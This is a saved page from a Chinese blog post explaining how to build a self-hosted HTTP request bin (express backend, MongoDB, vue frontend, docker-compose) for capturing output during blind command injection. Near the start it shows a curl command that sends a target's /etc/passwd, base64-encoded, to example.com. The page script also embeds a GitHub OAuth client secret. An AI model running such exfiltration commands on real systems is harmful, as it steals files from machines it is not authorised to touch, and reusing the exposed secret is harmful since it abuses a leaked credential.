@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>自己造一个 HTTP Bin</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen%EF%B9%96v=792c672b3c.css" />
+
+    <meta name="description" content="无回显命令注入时，经常需要利用 HTTP Bin. 我们用 express 实现了后端、vue 构建单页面前端，并采用 docker 部署到服务器上。" />
+    <link rel="icon" href="../content/images/size/w256h256/2020/02/small-3.png" type="image/png" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="Pion1eer" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="自己造一个 HTTP Bin" />
+    <meta property="og:description" content="无回显命令注入时，经常需要利用 HTTP Bin. 我们用 express 实现了后端、vue 构建单页面前端，并采用 docker 部署到服务器上。" />
+    <meta property="og:url" content="https://www.ruanx.net/http-bin/" />
+    <meta property="og:image" content="https://www.ruanx.net/content/images/2022/01/--.jpg" />
+    <meta property="article:published_time" content="2020-06-19T12:16:40.000Z" />
+    <meta property="article:modified_time" content="2020-06-30T00:42:33.000Z" />
+    <meta property="article:tag" content="Web" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="自己造一个 HTTP Bin" />
+    <meta name="twitter:description" content="无回显命令注入时，经常需要利用 HTTP Bin. 我们用 express 实现了后端、vue 构建单页面前端，并采用 docker 部署到服务器上。" />
+    <meta name="twitter:url" content="https://www.ruanx.net/http-bin/" />
+    <meta name="twitter:image" content="https://www.ruanx.net/content/images/2022/01/--.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Ruan Xingzhi" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Web" />
+    <meta property="og:image:width" content="2000" />
+    <meta property="og:image:height" content="1250" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Pion1eer",
+        "url": "https://www.ruanx.net/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://www.ruanx.net/content/images/size/w256h256/2020/02/small-3.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Ruan Xingzhi",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.ruanx.net/content/images/2020/05/blue.jpeg",
+            "width": 1024,
+            "height": 1024
+        },
+        "url": "https://www.ruanx.net/author/blue/",
+        "sameAs": []
+    },
+    "headline": "自己造一个 HTTP Bin",
+    "url": "https://www.ruanx.net/http-bin/",
+    "datePublished": "2020-06-19T12:16:40.000Z",
+    "dateModified": "2020-06-30T00:42:33.000Z",
+    "keywords": "Web",
+    "description": "无回显命令注入时，经常需要利用 HTTP Bin. 我们用 express 实现了后端、vue 构建单页面前端，并采用 docker 部署到服务器上。",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://www.ruanx.net/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.8" />
+    <link rel="alternate" type="application/rss+xml" title="Pion1eer" href="../rss/index.rss" />
+    <script defer src="https://cdn.jsdelivr.net/npm/@tryghost/portal@~2.5/umd/portal.min.js" data-ghost="https://www.ruanx.net/" data-key="595acd8f13c14d79a10527399d" data-api="https://www.ruanx.net/ghost/api/content/" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/npm/@tryghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="595acd8f13c14d79a10527399d" data-styles="https://cdn.jsdelivr.net/npm/@tryghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://www.ruanx.net/" crossorigin="anonymous"></script>
+    <script defer src="../public/cards.min%EF%B9%96v=792c672b3c.js"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min%EF%B9%96v=792c672b3c.css">
+    <!-- link href="https://fonts.googleapis.com/css?family=Noto+Serif+SC&display=swap" rel="stylesheet" -->
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Noto+Serif+SC&amp;display=swap" rel="stylesheet">
+
+<style>.post-content,.post-card-excerpt{font-family: 'Noto Serif SC', "PingFang SC","Helvetica Neue",Helvetica,"Hiragino Sans GB","Microsoft YaHei","微软雅黑",Arial,sans-serif;}
+    .post-full-content{font-size: 100%;}
+    .post-full-custom-excerpt {font-size: 1.8rem;}
+    .post-full-title {font-size:3.2rem;}
+    .post-full-content blockquote{margin:20px;padding: 1em;  background-color: #3eb0ef14; }
+    .post-full-content blockquote p {font-style:normal;}
+    .post-full-image {display:none;}
+    
+    /* .post-full-content figcaption {margin: .4em 0 .5em  !important} */
+    
+    .kg-callout-card {width: 100%; margin-bottom: 1em;}
+    
+    .post-full-content figure {margin: 0.8em 0 1em;}
+    
+    p {margin: 0.2em 0 0.5em !important;}
+    
+    .post-full-content img{border-radius:5px;}
+    
+    code {font-family: 'Noto Serif SC';}
+</style>
+
+
+<style>:root {--ghost-accent-color: #15171A;}</style>
+
+</head>
+<body class="post-template tag-web">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="../index.html">Pion1eer</a>
+            <div class="site-nav-content">
+                    <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-about"><a href="../about/index.html">About</a></li>
+</ul>
+
+                    <span class="nav-post-title dash">自己造一个 HTTP Bin</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://www.ruanx.net/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div>
+
+<script>
+ MathJax = {
+        tex:{
+                inlineMath: [['$', '$'], ['\\(', '\\)']]
+            },
+        svg:{
+                fontCache: 'global'
+            }
+        }; 
+    </script>
+    <script src="https://cdn.staticfile.org/babel-polyfill/7.12.1/polyfill.min.js?features=es6"></script>
+    <script type="text/javascript" id="MathJax-script" async  src="https://cdn.staticfile.org/mathjax/3.2.2/es5/tex-mml-chtml.js"></script>
+
+<style>@media (prefers-color-scheme: light) {
+		.post-full-content  
+    pre{background:#fafafa;margin:10px 10px 20px 10px;border-style: solid;border-color:#DCDFE6;}
+}
+</style>
+
+<link rel="stylesheet" href="https://cdn.ruanx.net/css/atom-one-dark.css">
+<link rel="stylesheet" media="(prefers-color-scheme: light)" href="https://cdn.ruanx.net/css/atom-one-light.min.css">
+<style>.post-full-content  code{font-family: 'Fira Mono', 'Jetbrains mono', 'ubuntu mono', consolas, 'monospace' !important;}
+</style>
+
+</header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-web no-image no-image">
+
+            <header class="post-full-header">
+
+                <section class="post-full-tags">
+                    <a href="../tag/web/index.html">Web</a>
+                </section>
+
+                <h1 class="post-full-title">自己造一个 HTTP Bin</h1>
+
+                <p class="post-full-custom-excerpt">无回显命令注入时，经常需要利用 HTTP Bin. 我们用 express 实现了后端、vue 构建单页面前端，并采用 docker 部署到服务器上。</p>
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/05/blue.jpeg" alt="Ruan Xingzhi" />
+                                    <div class="author-info">
+                                        <div class="bio">
+                                            <h2>Ruan Xingzhi</h2>
+                                            <p>Welcome to my site and hope you have fun.</p>
+                                            <p><a href="../author/blue/index.html">More posts</a> by Ruan Xingzhi.</p>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <a href="../author/blue/index.html" class="author-avatar">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/05/blue.jpeg" alt="Ruan Xingzhi" />
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="../author/blue/index.html">Ruan Xingzhi</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-06-19">19 Jun 2020</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>　　命令注入如果没有回显，我们一般利用 curl 之类的工具，往我们的 web 服务器发送一个请求，在 url 中携带敏感信息，请求完成后查看服务器日志。例如，在靶机上调用这样的代码：</p><pre><code class="language-bash">curl http://example.com/passwd-is-`cat /etc/passwd | base64`</code></pre><p>　　翻看服务器的 nginx 日志，就能知道靶机的 <code>/etc/passwd</code> 的内容。Request Bin 将这个过程自动化了：平台提供一个 web UI，供用户申请 request bin，并向用户实时反馈这个位置的访问记录。</p><p>　　Request Bin 分为 HTTP Requestbin 和 DNS Requestbin. 常用的公共服务有 <a href="http://ceye.io/">ceye.io</a> （似乎已经挂了）、<a href="http://requestbin.net/">requestbin.net</a> （国内直连非常慢）。所以我们自己实现一个 HTTP Bin，挂在国内的服务器上。</p><p>　　这是我第一次用 nodejs 写网站、第一次写单页面应用。<strong><u>本文的代码很可能是不佳实践，敬请注意，以免误导。</u></strong>利用的主要技术如下：</p><ul><li>nodejs + express （后端）</li><li>mongodb （数据库）</li><li>nodejs + webpack + vue （前端）</li><li>docker-compose （部署）</li></ul><p>　　成品：</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="../content/images/2020/06/image-16.png" class="kg-image" alt loading="lazy"><figcaption>▲&nbsp;首页&nbsp;</figcaption></figure><p></p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="../content/images/2020/06/image-17.png" class="kg-image" alt loading="lazy"><figcaption>▲&nbsp;展示板</figcaption></figure><p></p><hr><h2 id="-express-api">后端：express 实现 API</h2><p>　　项目的后端功能非常简单：</p><ul><li>对于所有形如 <code>/xxx/abc</code> 的访问，记录在数据库中</li><li>实现一个API，给定前缀 <code>/pre</code> ，查询所有 <code>/pre/*</code> 的访问记录。</li></ul><p>　　先建立一个 express 项目：</p><pre><code class="language-bash">npm init
+npm install --save express</code></pre><p>　　接下来，npm 装一下 MongoDB 和 moment 这两个库。我们连接 MongoDB 的数据库，每次访问时写入请求路径、用户 IP、访问时间。</p><pre><code class="language-javascript">const express = require('express')
+const app = express()
+const port = 3000
+
+const moment = require('moment')
+
+const MongoClient = require('mongodb').MongoClient;
+const url = process.env.DATABASE;
+const dbName = 'httpbin';
+
+const client = new MongoClient(url, { useUnifiedTopology: true });
+
+app.set('trust proxy', true)
+
+function queryLogs(req, res) {
+    client.connect(function(err) {
+        console.log("&lt;queryLogs&gt;: Connected successfully to server");
+        db = client.db(dbName);
+    
+        db.collection(req.params.binID).find().toArray(
+            function(err, result) {
+                if (err) throw err;
+
+                res.setHeader("Access-Control-Allow-Origin", "*");
+                res.send(result);
+            }
+        );
+    });
+}
+app.get('/api/queryLogs/:binID', queryLogs)
+
+
+function insertLog(req, res) {
+    res.send(req.ip);
+
+    client.connect(function(err) {
+        console.log("&lt;insertLog&gt;: Connected successfully to server");
+        db = client.db(dbName);
+    
+        db.collection(req.params.binID).insertOne({ip: req.ip, path: req.originalUrl, time:moment().format()})
+    });
+}
+app.get('/:binID/*', insertLog)
+app.get('/:binID', insertLog)
+
+app.listen(port, () =&gt; console.log(`app listening on port ${port}!`))</code></pre><p>　　后端这边，有几个值得注意的地方：</p><p>　　<strong>nodejs 的 MongoDB 库，对数据库的版本有要求。</strong>我们这里双方都选择了最新版。</p><p>　　<strong>采用环境变量来指定数据库地址</strong>，方便开发、部署。</p><p>　　<strong>把 <code>trust proxy</code> 设为 <code>true</code> .</strong> 这是因为，nginx 在转发请求时，我们一般选择把代理服务器的地址加入 X-Forward-For，这样如果后端是被 nginx 代理访问的，则 <code>req.ip</code> 会错误。而把 <code>trust proxy</code> 设为 <code>true</code> 之后，express 识别可信代理服务器（默认是几个内网的 ip 段，具体见 express 文档），然后 <code>req.ip</code> 就是用户的真实 ip 了。</p><p>　　<strong>设置跨域策略。</strong>否则，前端与后端 API 通讯时，如果前后端不在同一个域中，会被用户的浏览器拦截请求。</p><h2 id="-docker">后端：装进 docker</h2><p>　　为了维护方便，我们选择把 express 放在 docker 容器里面运行，并连接另一个 docker 容器的数据库。先写后端的 Dockerfile：</p><figure class="kg-card kg-code-card"><pre><code>FROM node
+WORKDIR /app
+COPY . /app
+
+RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+RUN echo 'Asia/Shanghai' &gt;/etc/timezone
+
+RUN npm install
+
+
+EXPOSE 3000
+ENTRYPOINT sh /app/docker-entrypoint.sh</code></pre><figcaption>▲ 将其放在 app.js、package.json&nbsp;等文件的相同目录</figcaption></figure><p>　　先设置时区为 UTC+8，这是因为 node 镜像的默认时区是 UTC，而 moment.js 是采用系统时区的。 <code>npm install</code> 之后，安装了所有依赖，直接执行 <code>node app.js</code> 就可以运行项目了，但这里并不是直接跑 <code>app.js</code> ，而是把 ENTRYPOINT 设为了一个 shell 脚本：</p><pre><code class="language-bash">node ./app.js</code></pre><p>　　<strong>这是一个较优的实践方案。</strong>一旦容器跑了起来，ENTRYPOINT 和 CMD 是不方便改动的。但我们可以修改这个脚本，来随时控制容器启动后的行为。另外，这个脚本只是一个文件，在容器关机情况下可以通过 <code>docker cp</code> 来覆盖掉，这对于很多容器一启动就退出的情况，提供了修改启动代码的机会。最后，如果容器里面的程序问题很严重，再怎么改启动代码也不可能启动，我们也可以把脚本修改为一句 <code>bash</code> ，来保持容器是 up 状态，从而可以 <code>docker exec</code> 进入容器，执行指令（例如备份数据之类的），而这在容器关机状态下是做不到的。综上所述，把 ENTRYPOINT 设为一个脚本文件而不是直接执行指令，是一个很好的维护习惯。</p><h2 id="-docker-compose-">后端：docker-compose 编排服务</h2><p>　　现在我们的后端已经准备好了。整个服务分为 express 和 mongodb 两部分，我们把这两个部分分别放进容器，然后 link 起来，从而外网无法访问 mongodb，增强安全性。 <code>docker-compose.yml</code> 这样写：</p><figure class="kg-card kg-code-card"><pre><code class="language-yaml">version: '2'
+services:
+    web:
+        build: ./backend/
+        depends_on:
+           - db
+        environment:
+           DATABASE: "mongodb://db:27017"
+        ports:
+           - "10101:3000"
+        links:
+           - "db:mongodb"
+        restart: always
+    db:
+        image: mongo
+        expose:
+           - "80"
+        restart: always</code></pre><figcaption>▲ <code>docker-compose.yml</code> 的内容</figcaption></figure><p>　　容器 <code>web</code> 利用 <code>./backend/Dockerfile</code> 进行构建，在容器 <code>db</code> 启动之后再启动；环境变量 <code>DATABASE</code> 设为 <code>mongodb://db:27017</code> ，将自己的 3000 端口映射到宿主机的 10101 端口。网络与容器 <code>db</code> 连接，并保持服务开启（容器关闭后自动重启）。</p><p>　　容器 <code>db</code> 从 <code>mongo</code> 镜像启动，暴露 80 端口，保持启动。</p><p>　　<strong>这里需要注意 expose 与 ports 的区别。</strong>expose 是给 link 到自己的容器访问的；ports 是映射主机端口用的。</p><p>　　最后，把这套服务建立起来：</p><pre><code class="language-bash">docker-compose up -d --build</code></pre><p>　　如果要暂停服务，可以用 <code>docker-compose stop</code> 指令。如果要删除这套服务，使用 <code>docker-compose down</code> 指令。</p><hr><h2 id="-">前端</h2><p>　　第一次用 webpack + vue 写代码，算是体会了一把前后端分离的好处。前端组件化之后，各种复用都很方便了；用 axios 与后端轮询通讯，以 500ms 的周期更新表格。</p><p>　　顺带一提，由于前后端完全分离，前端可以部署在 github pages 之类的静态页面上。最后的成品部署在了 Coding Pages ： <a href="https://bin.hitctf.cn/#/">https://bin.hitctf.cn/</a> </p><p>　　您也可以在下面这个 <code>iframe</code> 里面直接使用：</p><!--kg-card-begin: html--><figure class="kg-width-wide"><iframe style="width:60em;height:30em" frameborder=0 src="https://bin.hitctf.cn/"></iframe>
+</figure><!--kg-card-end: html-->
+                </div>
+            </section>
+
+
+            <div id="gitalk-container"></div>
+
+            <link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.css">
+            <script src="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.min.js"></script>
+
+            <script>
+                const gitalk = new Gitalk({
+
+                    proxy: 'https://cors.pion1eer.workers.dev/?https://github.com/login/oauth/access_token',
+
+                    clientID: '9f7e67174f5ab8b1a2b9',
+                    clientSecret: 'ddee425a0b50ed02a05fdedb1a4ea039e01b3170',
+                    repo: 'blogComment',
+                    owner: 'Ruanxingzhi',
+                    admin: ['Ruanxingzhi'],
+                    id: location.pathname,      // Ensure uniqueness and length less than 50
+                    distractionFreeMode: false  // Facebook-like distraction free mode
+
+                    });
+
+                gitalk.render('gitalk-container');
+            </script>
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <h3><span>More in</span> <a href="../tag/web/index.html">Web</a></h3>
+                    </header>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li>
+                                <h4><a href="../php-unserialize-writeups/index.html">PHP 反序列化漏洞题解集</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2021-08-11">11 Aug 2021</time> –
+                                        7 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="../selenium/index.html">自动实现每日疫情上报</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-07-07">7 Jul 2020</time> –
+                                        2 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="../pi-hole/index.html">Pi-hole 搭建去广告 DNS 服务器</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-06-07">7 Jun 2020</time> –
+                                        5 min read</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="../tag/web/index.html">See all 5 posts
+                            →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-algorithm tag-crypto no-image no-image">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../linear-basis/index.html">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">algorithm</div>
+                <h2 class="post-card-title">线性基算法概述</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>线性基指的是在线性空间中，动态维护一组基，实现“快速判断一个给定向量能否被这组基线性表示”等任务的高效算法。</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Ruan Xingzhi
+                    </div>
+            
+                    <a href="../author/blue/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/05/blue.jpeg" alt="Ruan Xingzhi" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/blue/index.html">Ruan Xingzhi</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-06-30">30 Jun 2020</time> <span class="bull">&bull;</span> 8 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post tag-web no-image no-image">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../pi-hole/index.html">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">Web</div>
+                <h2 class="post-card-title">Pi-hole 搭建去广告 DNS 服务器</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>在树莓派上利用 Pi-hole 搭建 DNS 服务器，可以屏蔽一些广告，同时能为 DNS 查询提供缓存加速。</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Ruan Xingzhi
+                    </div>
+            
+                    <a href="../author/blue/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/05/blue.jpeg" alt="Ruan Xingzhi" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/blue/index.html">Ruan Xingzhi</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-06-07">7 Jun 2020</time> <span class="bull">&bull;</span> 5 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="../index.html">Pion1eer</a> &copy; 2023</section>
+                <nav class="site-footer-nav">
+                    <a href="http://beian.miit.gov.cn/" target="_blank">湘ICP备20008720号-1</a>
+                    <a href="../index.html">Latest Posts</a>
+                    
+                    
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+<!--
+
+    <div class="subscribe-success-message">
+        <a class="subscribe-close" href="javascript:;"></a>
+        You've successfully subscribed to Pion1eer!
+    </div>
+
+    <div id="subscribe" class="subscribe-overlay">
+        <a class="subscribe-close" href="#"></a>
+        <div class="subscribe-overlay-content">
+            <div class="subscribe-form">
+                <h1 class="subscribe-overlay-title">Subscribe to Pion1eer</h1>
+                <p class="subscribe-overlay-description">Stay up to date! Get all the latest & greatest posts delivered straight to your inbox</p>
+                <form data-members-form="subscribe">
+                    <div class="form-group">
+                        <input class="subscribe-email" data-members-email placeholder="youremail@example.com"
+                            autocomplete="false" />
+                        <button class="button primary" type="submit">
+                            <span class="button-content">Subscribe</span>
+                            <span class="button-loader"><svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
+    y="0px" width="40px" height="40px" viewBox="0 0 40 40" enable-background="new 0 0 40 40" xml:space="preserve">
+    <path opacity="0.2" fill="#000" d="M20.201,5.169c-8.254,0-14.946,6.692-14.946,14.946c0,8.255,6.692,14.946,14.946,14.946
+s14.946-6.691,14.946-14.946C35.146,11.861,28.455,5.169,20.201,5.169z M20.201,31.749c-6.425,0-11.634-5.208-11.634-11.634
+c0-6.425,5.209-11.634,11.634-11.634c6.425,0,11.633,5.209,11.633,11.634C31.834,26.541,26.626,31.749,20.201,31.749z" />
+    <path fill="#000" d="M26.013,10.047l1.654-2.866c-2.198-1.272-4.743-2.012-7.466-2.012h0v3.312h0
+C22.32,8.481,24.301,9.057,26.013,10.047z">
+        <animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 20 20" to="360 20 20"
+            dur="0.5s" repeatCount="indefinite" />
+    </path>
+</svg></span>
+                        </button>
+                    </div>
+                    <div class="message-success">
+                        <strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
+                    </div>
+                    <div class="message-error">
+                        Please enter a valid email address!
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+-->
+
+    <script
+        src="https://cdn.ruanx.net/js/jquery.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+        crossorigin="anonymous">
+    </script>
+    <script src="../assets/built/casper%EF%B9%96v=792c672b3c.js"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+<script src="https://cdn.staticfile.org/highlight.js/10.1.1/highlight.min.js"></script>
+<script >hljs.initHighlightingOnLoad();</script>
+
+
+
+    <style>.kg-bookmark-metadata > .kg-bookmark-publisher:before {
+    content: "" !important; 
+    margin: 0 !important;
+}
+</style>
+
+</body>
+</html>
